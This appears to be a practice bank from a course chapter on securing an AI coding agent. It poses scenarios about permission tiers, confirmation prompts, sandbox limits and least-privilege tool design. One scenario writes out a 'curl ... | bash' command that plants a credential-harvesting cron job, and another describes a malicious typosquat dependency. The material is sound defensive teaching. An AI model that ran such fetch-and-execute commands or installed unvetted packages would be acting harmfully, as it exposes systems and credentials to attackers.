Chapter 11 Practice Bank ~28 min

Practice Bank: Security, Sandboxing, Permissions, Destructive Commands

A runnable script (starter.py / solution.py in this folder) hands you six real tool calls and asks whether each is ALLOWED, REQUIRES_CONFIRMATION, or BLOCKED under this chapter's actual policy. Predict, then run, then work through the six scenarios below, which extend the same judgment to situations the script's six calls don't cover.

Scenario · The confirmation that comes back too fast

A "yes" that arrived in 40 milliseconds

An agent calls write_file on a 300-line file. The confirmation prompt appears, and a "y" comes back 40 milliseconds later — far faster than a human could plausibly have read the proposed content, if it were shown at all. confirm_with_human as built in this chapter only checks the ANSWER, not how it was produced or how quickly it arrived. What does this scenario reveal about the actual guarantee a stdin-based confirmation step provides — and does not provide — and what would need to change about the prompt itself (not the policy tiers) to make a rushed or rubber-stamped "yes" less likely?

Scenario · Sandboxing vs. permission scoping

The CPU limit didn't stop the actual problem

A confirmed run_shell_command call runs curl https://example.com/install.sh | bash — not denylisted (no pattern matches it), well within the 5-second CPU limit and 512MB memory cap this chapter's resource.setrlimit hardening provides. The downloaded script quietly writes a credential-harvesting cron job outside the workspace directory before exiting normally. Which of this chapter's two mechanisms — the permission-scope layer or the process-level resource limits — was ever positioned to catch this, and which honestly was not? What category of protection would actually have been needed?

Scenario · Least privilege, retrospectively

Redesigning run_shell_command for a real production codebase

You're adapting this chapter's agent for a real internal tool that operates on a sensitive production monorepo, not a learning workspace. run_shell_command as built here can run literally any command that isn't denylisted, gated only by a single per-tool confirmation. Propose a genuinely least-privilege redesign — would you keep one general-purpose shell tool at all, or replace it with several narrower tools (e.g. run_tests, run_linter, install_declared_dependency) each with its own tier? What do you gain, and what do you give up in flexibility?

Scenario · A hard-to-classify tool

Where does git_diff --stat belong if it can be abused?

git_diff is ALLOWED because it's read-only. A teammate points out that git diff against a very large binary file, or a deliberately huge diff, could still be used to exhaust memory or flood a log file, even though it changes no state. Does that risk mean git_diff should move to REQUIRES_CONFIRMATION, or is "changes no state" still the right test for the ALLOWED tier, with resource exhaustion better handled by a completely different mechanism (e.g. output truncation)? Defend your answer.

Scenario · Supply-chain risk hiding in plain sight

The dependency the agent was never told not to add

A task asks the agent to "add retry logic using an appropriate library." The agent runs pip install some-obscure-retry-lib via a confirmed run_shell_command call — a human said yes, because the request itself sounded reasonable and the confirmation prompt just showed the raw command string. The package turns out to be a typosquat with a malicious postinstall script. Which category from this chapter's threat model does this fall under, and what does it suggest about the LIMITS of a confirmation prompt that only shows a command string, without any context about what's actually being installed or from where?

Scenario · Two agents, two different risk tolerances

Should every agent share the same TOOL_POLICY?

Your team runs two agents built from this chapter's code: one that only ever operates on a disposable scratch repo used for experiments, and one that operates on the team's actual production deployment scripts. Both currently share the exact same TOOL_POLICY dict. Should they? What's the argument for keeping git_commit at REQUIRES_CONFIRMATION for both versus making it ALLOWED for the scratch-repo agent specifically — and what's the argument against ever loosening a tier just because the current workspace happens to be low-stakes?
